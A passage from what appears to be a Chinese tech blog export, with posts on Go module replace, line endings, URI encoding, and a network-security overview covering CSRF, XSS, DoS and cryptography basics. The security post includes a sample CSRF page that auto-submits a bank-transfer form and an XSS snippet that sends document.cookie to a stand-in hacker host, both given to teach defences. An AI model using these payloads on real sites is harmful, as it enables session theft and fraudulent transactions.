<li>require=path@version or droprequire=path@version: 添加依赖 or 删除依赖</li>
<li>replace=oldpath=newpath or droprequire=oldpath: 替换依赖</li>
</ul>
</li>
</ul>
<p>这里重点说下 -replace 选项，因为在生产中经常遇到的一种情况是由于这样那样的原因我们需要 fork 一个私有仓库去改动第三方开源库，例如有个小哥针对 logrus 做了二次开发 github.com/gogap/logrus，这个时候就需要用 github.com/gogap/logrus 替换之前的第三方开源库 github.com/sirupsen/logrus，操作如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go mod edit -replace=<span class="string">"github.com/sirupsen/logrus=github.com/gogap/logrus@v0.8.2"</span></span><br><span class="line"></span><br><span class="line">$ cat go.mod</span><br><span class="line"></span><br><span class="line">module <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">go 1.12</span><br><span class="line"></span><br><span class="line">require github.com/sirupsen/logrus v1.4.2</span><br><span class="line"></span><br><span class="line">replace github.com/sirupsen/logrus =&gt; github.com/gogap/logrus v0.8.2</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>回车 or 换行？</title>
    <url>/2020/02/16/%E5%9B%9E%E8%BD%A6-or-%E6%8D%A2%E8%A1%8C%EF%BC%9F/</url>
    <content><![CDATA[<p>以前编程的时候一直没注意回车符与换行符的区别，只是大概知道一个是 \r 一个是 \n。今天心血来潮查了一下，发现这还蛮有趣的~</p>
<h1 id="回车-CR"><a href="#回车-CR" class="headerlink" title="回车 CR"></a>回车 CR</h1><p>原名 Carriage Return，ASCII 码 13。表示光标回到行首。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">"hello\rworld"</span>)</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment">#   world</span></span><br></pre></td></tr></table></figure>
<h1 id="换行-LF"><a href="#换行-LF" class="headerlink" title="换行 LF"></a>换行 LF</h1><p>原名 Line Feed，ASCII 码 10。表示光标移动到下一行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">"hello\nworld"</span>)</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment">#   hello</span></span><br><span class="line"><span class="comment">#   world</span></span><br></pre></td></tr></table></figure>
<h1 id="渊源"><a href="#渊源" class="headerlink" title="渊源"></a>渊源</h1><p>在计算机还没有出现之前，有一种叫做电传打字机（Teletype Model 33）的玩意，每秒钟可以打 10 个字符。但是它有一个问题，就是打完一行换行的时候，要用去 0.2 秒，正好可以打两个字符。要是在这0.2秒里面，又有新的字符传过来，那么这个字符将丢失。</p>
<p><img src="https://i.loli.net/2020/02/16/kMxhL2pTCwBZASi.png" alt="打字机"></p>
<p>于是，研制人员想了个办法解决这个问题，就是在每行后面加两个表示结束的字符。一个叫做“回车”，告诉打字机把打印头定位在左边界；另一个叫做“换行”，告诉打字机把纸向下移一行。<br>这就是“换行”和“回车”的来历，从它们的英语名字上也可以看出一二。至于为什么回车在前换行在后呢？因为回车需要的时间更长，机器可以利用这个间隙完成换行操作。</p>
<p>后来，计算机发明了，这两个概念也就被般到了计算机上。那时，存储器很贵，一些科学家认为在每行结尾加两个字符太浪费了。于是，就出现了分歧：</p>
<ul>
<li>\r\n: Windows 系统行末结束符</li>
<li>\r: Mac 系统行末结束符</li>
<li>\n: Unix 系统行末结束符</li>
</ul>
<p>一个直接后果是，Unix/Mac 系统下的文件在 Windows 里打开的话，所有文字会变成一行；而 Windows 里的文件在 Unix/Mac 下打开的话，在每行的结尾可能会多出一个 ^M 符号。</p>
<p>总结：虽然不同操作系统对行末结束符的定义不同，但 \r\n 是历史传统而且被多个标准（如 HTTP，SMTP）所采纳，所以实际使用中还是以 \r\n 居多。</p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之URI</title>
    <url>/2020/02/13/URI%E4%B8%8EURL/</url>
    <content><![CDATA[<h1 id="什么是-URI"><a href="#什么是-URI" class="headerlink" title="什么是 URI"></a>什么是 URI</h1><p>URI(Uniform Resource Identifier)：统一资源标识符，用于<strong>唯一标识一个资源</strong>。</p>
<p>URL(Uniform Resource Locator)：统一资源定位符，表明在一个资源在网络中的访问方式。通常表现为 <code>协议+路径+参数</code></p>
<p>URN(Uniform Resource Name)：统一资源定位名称，通过某个命名空间中的唯一 ID 来标识一个资源</p>
<p><img src="https://i.loli.net/2020/02/13/2XjAU6Phz9ONJQq.png" alt="URI"></p>
<p>举个例子：小红的学号是 123456，这个学号就是 URN，能对应到小红这个人；小红的家庭住址是翻斗大街翻斗花园二号楼一零零一室，这个地址就是 URL，去那里就能找到小红。小红的学号、小红的住址都属于 URI。</p>
<h1 id="URI-的格式"><a href="#URI-的格式" class="headerlink" title="URI 的格式"></a>URI 的格式</h1><p>一个标准的 URI 格式为：<code>[scheme:]scheme-specific-part</code>，如：<a href="http://qiuyueqy.com" target="_blank" rel="noopener">http://qiuyueqy.com</a>, mailto:<a href="mailto:qiuyue9971@126.com" target="_blank" rel="noopener">qiuyue9971@126.com</a>, news:comp.go.lang</p>
<p>URI 可以细分为为<code>不透明的(opaque)</code>和<code>分层的(hierarchical)</code>两类：</p>
<ul>
<li>opaque 指 scheme-specific-part 不以 / 开头，是一个整体。呈 [scheme]:opaque[?query][#fragment] 的形式。如：mailto:<a href="mailto:qiuyue9971@126.com" target="_blank" rel="noopener">qiuyue9971@126.com</a>，<a href="http://www.google.com:443" target="_blank" rel="noopener">www.google.com:443</a>, opaque 必须是绝对的。</li>
<li>hierarchical 指 scheme-specific-part 以 / 开头且可以划分为好几部分。呈 [scheme:][//[userinfo@]host[:port]]path[?query][#fragment] 的形式。如：<a href="http://qiuyueqy.com/categories/" target="_blank" rel="noopener">http://qiuyueqy.com/categories/</a>, hierarchical 可以是绝对的，也可以是相对的，如：<a href="https://github.com/yue-qiu/CUG_EmptyClassroom" target="_blank" rel="noopener">https://github.com/yue-qiu/CUG_EmptyClassroom</a>, ../../static/verify.js</li>
</ul>
<h1 id="谈谈-URI-编码"><a href="#谈谈-URI-编码" class="headerlink" title="谈谈 URI 编码"></a>谈谈 URI 编码</h1><p>利用 URI 传参时，如果某些 URI 组件字符（如 /:?@&amp;=+$,#）同时也是参数的一部分会导致 URI 歧义。此外，URI 只支持 ASCII 编码，对于茫茫多的特殊字符（如：广东省）如何表示？</p>
<p>所谓办法总比困难多，为了解决这些问题，URI 编码应运而生。举个栗子，对下面这个未经编码的 URI：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://qiuyueqy.com/?page=2&amp;category=广东</span><br></pre></td></tr></table></figure>
<p>要表示特殊字符，我们把它按某个字符集（通常是 UTF-8）编码成十六进制的 %hh 形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://qiuyueqy.com?page=2&amp;category=%E5%B9%BF%E4%B8%9C</span><br></pre></td></tr></table></figure>
<p>如果这个 URI 是另一个 URI 的参数，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">httpw://www.google.com?callback=http://qiuyueqy.com/?page=2&amp;category=广东</span><br></pre></td></tr></table></figure>
<p>显然，由于参数中 /、? 等组件字符的存在，上面这个 URI 的解释是有歧义的。这时，我们把整个回调 URI（包括它的组件字符）进行编码，再作为参数就没问题了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">httpw://www.google.com?callback=http%3A%2F%2Fqiuyueqy.com%2F%3Fpage%3D2%26category%3D%E5%B9%BF%E4%B8%9C</span><br></pre></td></tr></table></figure>
<h1 id="golang-对-URL-的实现"><a href="#golang-对-URL-的实现" class="headerlink" title="golang 对 URL 的实现"></a>golang 对 URL 的实现</h1><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> URL <span class="keyword">struct</span> &#123;</span><br><span class="line">    Scheme   <span class="keyword">string</span>    <span class="comment">//具体指访问服务器上的资源使用的哪种协议</span></span><br><span class="line">    Opaque   <span class="keyword">string</span>    <span class="comment">// 编码后的不透明数据</span></span><br><span class="line">    User     *Userinfo <span class="comment">// 用户名和密码信息,有些协议需要传入明文用户名和密码来获取资源，比如 FTP</span></span><br><span class="line">    Host     <span class="keyword">string</span>    <span class="comment">// host或host:port，服务器地址，可以是 IP 地址，也可以是域名信息</span></span><br><span class="line">    Path     <span class="keyword">string</span>  <span class="comment">//路径，使用"/"分隔</span></span><br><span class="line">    RawQuery <span class="keyword">string</span> <span class="comment">// 编码后的查询字符串，没有'?'</span></span><br><span class="line">    Fragment <span class="keyword">string</span> <span class="comment">// 引用的片段（文档位置），没有'#'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>应用层</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之网络安全</title>
    <url>/2020/02/06/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h2 id="网络安全的基本属性"><a href="#网络安全的基本属性" class="headerlink" title="网络安全的基本属性"></a>网络安全的基本属性</h2><ul>
<li>机密性：发送方加密，预定接收方解密</li>
<li>身份认证：发送方与预定接收方能确定彼此身份</li>
<li>完整性：信息不会被篡改，即使被篡改了也可以被检测出来</li>
</ul>
<h2 id="常见攻击手段"><a href="#常见攻击手段" class="headerlink" title="常见攻击手段"></a>常见攻击手段</h2><ul>
<li>映射（Mapping）：利用 ping 确定网络上运行主机的地址，再通过<strong>端口扫描</strong>依次尝试与每个端口建立 TCP 连接，找出主机在运行的服务</li>
<li>嗅探（sniffing）：在共享介质网络中，攻击方接收所有经过它的分组，层层解析后得到数据<br><img src="https://i.loli.net/2020/02/06/s8lqcjTVEtJ4f5M.png" alt="分组嗅探"></li>
<li>IP 欺骗：修改分组的源 IP 地址，冒充发送方</li>
<li>拒绝服务（DoS）：向接收方恶意泛洪分组，淹没接收方（带宽耗尽、资源耗尽）<br><img src="https://i.loli.net/2020/02/06/CearKxmuZjUF1fz.png" alt="DDoS"><br><img src="https://i.loli.net/2020/02/06/TgOkCnZjJm1BEwX.png" alt="反射DDos"></li>
<li>中间人攻击：对源主机伪装成目的主机，对目的主机伪装成源主机</li>
</ul>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>
<p>因为浏览器在访问网站的时候会自动带上 cookie，攻击者通过发送跨站请求使用户在不知不觉中在另一个网站完成某种操作。这种攻击就称为 CSRF。</p>
<p><img src="https://i.loli.net/2020/06/04/svxj1aRo9idAtgK.png" alt="CSRF"></p>
<p>由此可见，要完成一次 CSRF，受害者需要经历一下两步：</p>
<ol>
<li>登录受信任网站 A，并在本地生成 Cookie。</li>
<li>在不登出 A 的情况下，访问危险网站 B</li>
</ol>
<p>举个例子：</p>
<p>银行网站 A，它以 post 请求来完成银行转账的操作，如：<code>http://www.mybank.com/Transfer.php</code></p>
<p>危险网站B，它里面有一段 HTML代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">　　　　　　function steal()</span><br><span class="line">　　　　　　&#123;</span><br><span class="line">          　　　　 iframe = document.frames["steal"];</span><br><span class="line">　　     　　      iframe.document.Submit("transfer");</span><br><span class="line">　　　　　　&#125;</span><br><span class="line">　　　　<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">　　<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"steal()"</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"steal"</span> <span class="attr">display</span>=<span class="string">"none"</span>&gt;</span></span><br><span class="line">　　　　　　<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"transfer"</span>　<span class="attr">action</span>=<span class="string">"http://www.myBank.com/Transfer.php"</span>&gt;</span></span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"toBankId"</span> <span class="attr">value</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"1000"</span>&gt;</span></span><br><span class="line">　　　　　　<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果用户先访问 A 再访问 B，那么点击了这个危险连接之后用户就少了 1000 块！因为访问 B 之前已经登录了 A，而 B 背地里暗搓搓地向 A 发出 post 请求，所以浏览器会带上 A 的 Cookie 去向 <code>http://www.mybank.com/Transfer.php</code> 发出请求，结果银行网站服务器收到请求后，认为这是一个转账操作，所以就立刻进行转账操作……</p>
<p>如何进行防护：</p>
<ul>
<li>为每个表单添加一个隐藏字段保存伪随机数 token，接收表单时先验证 token 合法性，这样攻击者就无法伪造 post 请求了</li>
<li>提交表单需要验证码。其实这样和用 token 差不多，只不过一个在明一个在暗</li>
<li>验证 Referer 头部</li>
</ul>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS 全称是 Cross site script，即跨站脚本，为避免与 CSS 混淆简称 XSS。</p>
<p>攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到 web 页面中。使别的用户访问页面都会执行相应的嵌入代码。从而盗取用户 cookie、对访问者进行病毒侵害的一种攻击方式。</p>
<p>把代码嵌入网页的场景其实很常见。想象一个这样的场景：用户在某个论坛回帖，他回复的内容就会嵌入到这个网页中去。如果服务器不对用户的输入做过滤，一旦回复的内容是一段有恶意的代码，这段代码就会影响所有访问这个网页的人。</p>
<h4 id="反射性-XSS"><a href="#反射性-XSS" class="headerlink" title="反射性 XSS"></a>反射性 XSS</h4><p>又称为非持久性跨站点脚本攻击，它是最常见的 XSS，特征是攻击者注入的数据反应在响应中。一个典型的非持久性 XSS 包含一个带 XSS 攻击向量的链接(即每次攻击需要用户的点击)</p>
<p>举个例子：正常情况下，用户访问 <code>http://example.org?search=hello</code> 会显示 search 参数的值即 “hello”。然而，一旦攻击者把这样的地址嵌入到网页中 <code>http://example.org?search=&lt;script&gt;src=&#39;http://hacker.com/xss.js&#39;&lt;/script&gt;</code>，请求响应中就会包含并执行这样一段 js 代码 <code>&lt;script&gt;src=&#39;http://hacker.com/xss.js&#39;&lt;/script&gt;</code>，一旦 xss.js 包含了恶意操作，用户信息就被泄露了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// xss.js 文件中的代码</span></span><br><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.width = <span class="number">0</span>;</span><br><span class="line">img.height = <span class="number">0</span>;</span><br><span class="line">img.src = <span class="string">'http://hacker.org/xss?cookie='</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.cookie); <span class="comment">// 窃取用户 cookie</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h4 id="存储性-XSS"><a href="#存储性-XSS" class="headerlink" title="存储性 XSS"></a>存储性 XSS</h4><p>又称为持久型跨站点脚本。与反射性 XSS 靠用户点击触发不同，存储性 XSS 把攻击脚本存储在网页中，每次用户访问这个网页都会自动执行恶意代码进行攻击。</p>
<p>举个例子：用户在留言板中正常回复是这样的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">“text”</span> <span class="attr">name</span>=<span class="string">“content”</span> <span class="attr">value</span>=<span class="string">“这里是用户填写的数据”</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务器把 value 储存在数据库中，这样每次用户访问这个页面都可以看到这条回复。而攻击者可以在 value 中填入以下内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">哈哈哈，有趣有趣</span><br><span class="line">&lt;script&gt;src=<span class="string">'http://hacker.com/xss.js'</span>&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果服务器也把这段代码入库并且嵌入到网页，那么每当用户访问访问这条留言都会执行 xss.js 中的代码。</p>
<p>如何进行防护：</p>
<ul>
<li>设置 Cookie 的属性为 <code>Http only</code>，这样 js 就无法获取 Cookie 值</li>
<li>严格检查表单提交的类型。比如 age 字段一定要是数字</li>
<li>过滤或移除特殊的 HTML 标签，如 <code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code></li>
<li>对用户提交的数据就行 <code>Html Encode</code> 处理，将其转换为 HTML 实体字符的普通文本。比如 <code>&lt;</code> 转换为 <code>&amp;lt</code>，<code>&quot;</code> 转换为 <code>&amp;quot</code></li>
</ul>
<h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><p>拒绝服务攻击即是攻击者想办法让目标机器停止提供服务，只要能够对目标造成麻烦，使某些服务被暂停甚至主机死机，都属于拒绝服务攻击。</p>
<p>拒绝服务攻击问题一直得不到合理的解决，究其原因是因为网络协议本身的安全缺陷，从而拒绝服务攻击也成为了攻击者的终极手法。攻击者进行拒绝服务攻击，实际上让服务器实现两种效果：一是迫使服务器的缓冲区满，不接收新的请求；二是使用IP欺骗，迫使服务器把非法用户的连接复位，影响合法用户的连接。</p>
<h4 id="SYN-洪水攻击"><a href="#SYN-洪水攻击" class="headerlink" title="SYN 洪水攻击"></a>SYN 洪水攻击</h4><p>SYN Flood 是一种广为人知的攻击，因为现在建立 TCP 连接都要经历都是采用三次握手所以对现代网络不太有效。</p>
<p>SYN Flood 攻击目前有两种方法，都与服务器没收到 ACK 有关。恶意用户可以跳过传送最后的 ACK 信息或者在 SYN 里通过欺骗来源 IP 地址，让服务器送 SYN-ACK 到假的 IP 地址，因此永不可能收到 ACK。大量半开状态的 TCP 连接占用了服务器全部资源，正常用户的访问被拒绝。</p>
<p>防御 SYN Flood 有几种简单的办法：</p>
<ol>
<li>缩短 SYN Timeout 时间：由于 SYN Flood 攻击的效果取决于服务器上保持的 SYN 半连接数，这个值等于 SYN 攻击的频度 × SYN Timeout，所以通过缩短 SYN 半连接状态的时间可以大大降低服务器压力。</li>
<li>设置 SYN Cookie：设置 SYN Cookie 就是给每一个请求连接的 IP 地址分配一个 Cookie，如果短时间内连续受到某个 IP 的重复 SYN 报文，就认定是受到了攻击，以后从这个 IP 地址发来的包会被丢弃。</li>
</ol>
<p>上述的两种方法只能对付比较原始的 SYN Flood，缩短 SYN Timeout 时间仅会在对方攻击频度不高的情况下生效，SYN Cookie 更依赖于对方使用真实的 IP 地址，如果攻击者以数万/秒的速度发送 SYN 报文，同时利用 SOCK_RAW 随机改写 IP 报文中的源地址，以上的方法将毫无用武之地。</p>
<h4 id="哈希洪水攻击"><a href="#哈希洪水攻击" class="headerlink" title="哈希洪水攻击"></a>哈希洪水攻击</h4><p>使用拉链法实现的 hash 表最坏情况下插入 n 个值的时间复杂度为 O(n^2)。既然如此，如果攻击者掌握了服务器使用的散列函数背后的实现原理，就可以轻易构建出一批具有相同散列码的值，让服务器把资源全部耗费在 hash 表的插入操作上。依 2011 年的实验数据，攻击一台基于 Java（Tomcat）的服务器时，仅仅需要 6KB/s 的流量就能打瘫一颗 Intel i7 处理器，1GB/s 的流量可以打瘫 100000 颗 Intel i7 处理器，性价比远超 TCP 半开连接等传统的拒绝服务攻击。</p>
<p>防御哈希洪水攻击：</p>
<ul>
<li>使用带密钥哈希算法：如果攻击者不能掌握散列函数所有细节，就不能给出一组频繁碰撞的键，也就无法发动哈希洪水攻击。如果在散列函数中加入一个秘密参数，每建一张哈希表就随机生成一个新的秘密参数。这样一来，即使是同样的内容，放在不同的表里也会产生完全不同的内存分配。这整个过程攻击者完全无法预测，即使发生碰撞，也是小概率的巧合，而不是黑客在主动控制，攻击也就不可能成立了。这个秘密参数称为哈希种子（Hash Seed），而这类使用哈希种子的哈希算法，我们称之为带密钥哈希算法（Keyed Hash Function）</li>
<li>换一种 hash 表的实现方式：JDK 8 使用了一种新的逻辑来构建 hash 表。当一个位置存储的元素个数小于8个时，仍然使用链表存储；当一个位置存储的元素个数大于等于8个时，改为使用平衡树来存储。这样就可以保证最差的插入时间是 O(nlogn) 了。为什么要设立“8个元素”这样一个限制呢？因为平衡树相比链表而言有着更高的开销，以及更散乱的内存布局（影响缓存命中率）。在正常情况下，哈希表的一个位置大约只会存储 1~4 个左右的元素，所以没有必要专门开一个平衡树来存储冲突的元素，对一些性能敏感的应用来说会造成显著的负面影响。</li>
</ul>
<h2 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h2><ul>
<li>明文：没有进过加密的数据</li>
<li>密文：进过加密算法加密的数据</li>
<li>加密、解密密钥：用于辅助加密、解密的参数</li>
</ul>
<p>按加密密钥与解密密钥是否相同，将加密算法分为两大类：<strong>对称加密</strong>（加解密钥相同）与<strong>非对称加密</strong>（每方有公开、私有两个密钥）</p>
<p>现代技术不是针对字母而是针对<strong>二进制位</strong>进行操作：</p>
<ul>
<li><p>对称加密</p>
<ul>
<li>流密码：密钥产生密钥流，由密钥流对数据流进行加解密。换言之，加密与解密使用的是同一个密钥<br><img src="https://i.loli.net/2020/02/07/HOK1XPzD7aq8Ckc.png" alt="流密码"></li>
<li><p>分组密码：将明文序列划分为若干长为 M 的明文组，各明文组利用长为 i 的密钥组变换得到若干长度为 N 的密文组。通常分组长度取 64 bits</p>
<p><img src="https://i.loli.net/2020/02/07/JOH4tvB5z1qgnU8.png" alt="Feistel分组密码"></p>
</li>
</ul>
</li>
<li>非对称加密：加密与解密需要两个不同的密钥</li>
</ul>
<h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><h4 id="分组密码例子：DES"><a href="#分组密码例子：DES" class="headerlink" title="分组密码例子：DES"></a>分组密码例子：DES</h4><p>DES：数据加密标准（Data Encryption Standand），本质是 16 轮的 Feistel 分组密码，分组长度为 64 bits，密钥长度为 56 bits，每轮产生一个 48 bits 的子密钥：</p>
<p><img src="https://i.loli.net/2020/02/07/KQu1WXrx9wV4Dfj.png" alt="DES加密"></p>
<p><img src="https://i.loli.net/2020/02/07/c9g7j84hTADVRG5.png" alt="子密钥生成"></p>
<p>IP 置换：把输入数据的<strong>排列顺序打乱</strong></p>
<h4 id="分组密码例子：AES"><a href="#分组密码例子：AES" class="headerlink" title="分组密码例子：AES"></a>分组密码例子：AES</h4><p>AES：高级加密标准（Advanced Encryption Standand），分组长度 128/192/256 bits，可提供 128/192/256 bits 密钥，循环次数在一定范围内可变，与 DES 相比安全得多。</p>
<h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>公钥加密算法的需求：</p>
<ul>
<li>公钥加密 K<sub>B</sub><sup>+</sup> 和私钥解密 K<sub>B</sub><sup>-</sup> 要满足：K<sub>B</sub><sup>-</sup>(K<sub>B</sub><sup>+</sup>(m)) = m</li>
<li>给定公钥 K<sub>B</sub><sup>+</sup>，不可能计算得到 K<sub>B</sub><sup>-</sup></li>
</ul>
<h4 id="非对称加密例子：RSA"><a href="#非对称加密例子：RSA" class="headerlink" title="非对称加密例子：RSA"></a>非对称加密例子：RSA</h4><p>任何信息在计算机中都以比特流的形式表示，每个比特流可以表示为一个唯一的整数，因此<strong>加密一个报文就等于加密一个整数</strong>。</p>
<p>RSA 公钥/私钥生成过程：</p>
<ol>
<li>选择 2 个大质数 p 和 q</li>
<li>计算 n = pq，z = (p-1)(q-1)</li>
<li>选择 e(e &lt; n)，使 e 与 z 互质</li>
<li>选择 d 使 ed mod z = 1</li>
<li>得到公钥 (n,e)，私钥（n,d）</li>
</ol>
<p>给定公钥 (n,e)和私钥(n,d)，RSA 加密过程：</p>
<ol>
<li>加密报文 m 时，计算 c = m<sup>e</sup> mod n</li>
<li>解密报文 c 时，计算 m = c<sup>d</sup> mod n</li>
</ol>
<p>总结：<strong>m = (m<sup>e</sup> mod n)<sup>d</sup> mod n = m<sup>ed</sup> mod n = m<sup>ed mod z</sup> mod n</strong></p>
<p>RSA 的公钥密钥是相对的，即可以用公钥加密私钥解密，也可以用私钥加密公钥解密：K<sub>B</sub><sup>-</sup>(K<sub>B</sub><sup>+</sup>(m)) = m = K<sub>B</sub><sup>+</sup>(K<sub>B</sub><sup>-</sup>(m))</p>
<p>由于 RSA 运算强度超高，实际应用中几乎不可能用于加密大报文，所以常常与对称加密结合使用。即用 RSA 解决对称加密中密钥分发问题，再利用对称加密算法对数据进行加密。这种方式分发的密钥称为<strong>会话密钥</strong>。</p>
<h2 id="报文完整性"><a href="#报文完整性" class="headerlink" title="报文完整性"></a>报文完整性</h2><p>报文完整性也称为报文认证，目标有：</p>
<ul>
<li>证明报文确实来自<strong>声称的发送方</strong></li>
<li>验证报文<strong>没有被篡改</strong></li>
<li>预防报文的<strong>时间、顺讯、持有期被修改</strong></li>
</ul>
<p>对报文应用散列函数 H 得到一个<strong>固定长度</strong>的散列码。这个散列码称为<strong>报文摘要</strong>，相当于源报文的数字指纹，可以用于报文认证。</p>
<p><strong>常见的散列函数算法：</strong></p>
<ul>
<li>MD5：对任意长度的报文输入，计算输出 128 bits 散列值</li>
<li>SHA-1（Secure Hash Algorithm）：要求输入长度 &lt; 2<sup>64</sup>，计算输出 160 bits 散列值。速度较慢但是安全性高于 MD5</li>
</ul>
<p><img src="https://i.loli.net/2020/02/08/5nhQBRmlwc8ApJY.png" alt="报文认证"></p>
<p>这种报文认证方法虽然能验证报文完整性，但是无法解决否认（发送方不承认自己发送过某一报文）、伪造（接收方伪造一份报文并声称来自发送方）、篡改（接收方对收到的信息进行修改）等问题，由此衍生了现实中广泛使用的数字签名（Digital Signatures）技术</p>
<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名是实现安全电子交易的核心技术之一，特点是：</p>
<ul>
<li>可验证性：可以验证发送方身份、报文是否被篡改</li>
<li>不可伪造性：接收方无法伪造报文</li>
<li>不可抵赖性：发送方无法否认曾经发送过这样一个报文</li>
</ul>
<p>要实现数字签名，必须依赖于加密技术。但是为了确保接收方不可能伪造报文，无法使用对称加密技术。</p>
<p>签名过程举例：Bob 作为发送方给 Alice 发消息</p>
<p><img src="https://i.loli.net/2020/02/08/piZw95RkYKrS8a4.png" alt="签名报文摘要"></p>
<p>经过加密的报文摘要称为<strong>报文认证码（MAC）</strong>，是基于密钥和消息摘要所获得的一个值，可用于数据源认证和完整性校验。</p>
<h2 id="密钥分发中心（KDC）"><a href="#密钥分发中心（KDC）" class="headerlink" title="密钥分发中心（KDC）"></a>密钥分发中心（KDC）</h2><p>解决两个实体在网上共享对称密钥的问题，由此引入“可信任的密钥分发中心（Key Distribution Center）”作为两实体间的中介。</p>
<p>KDC 本质上是一个服务器，每个使用共享密钥服务的用户都要在此注册一个专属密钥。</p>
<p>密钥分发举例：Alice 与 Bob 使用 KDC 为中介共享密钥，R 即是 Alice 与 Bob 间的会话密钥</p>
<p><img src="https://i.loli.net/2020/02/08/nlT748VJQMcCpHW.png" alt="密钥分发"></p>
<h2 id="认证中心（CA）"><a href="#认证中心（CA）" class="headerlink" title="认证中心（CA）"></a>认证中心（CA）</h2><p>CA 负责公钥分发（保证公钥的来源可信），实现特定实体与其公钥的绑定：</p>
<p>假设 Bob 在 CA 注册他的公钥信息：</p>
<ol>
<li>Bob 向 CA 提供身份证明</li>
<li>CA 创建绑定 Bob 身份及其公钥的证书</li>
<li>证书包含 CA 签名的 Bob 的公钥</li>
</ol>
<p><img src="https://i.loli.net/2020/02/08/uBWcYDPXKn4Mepv.png" alt="CA认证"></p>
<p>Alice 想要得到 Bob 的公钥：</p>
<ol>
<li>获得 Bob 的公钥证书</li>
<li>应用 CA 的公钥解密，获得 Bob 的公钥</li>
</ol>
<p><img src="https://i.loli.net/2020/02/08/SDnVh2NzTKMeAu5.png" alt="CA解密"></p>
<p>一张公钥证书包含的要素有：</p>
<ul>
<li>序列号：唯一发行号</li>
<li>持有人信息：机构名，机构公钥，签名算法</li>
<li>发行者信息</li>
<li>有效期：保证在这个时间内从 CA  获得的公钥是有效的</li>
<li>发行者数字签名</li>
</ul>
<p><img src="https://i.loli.net/2020/02/09/Zv6k1a8u2Oc3SCI.png" alt="公钥证书"></p>
<h2 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h2><p>安全套接字层（SSL）或传输层安全（TLS） 可作为基础协议栈的组成部分，对应用透明。使用 SSL 后，传送 的应用层数据会被加密：</p>
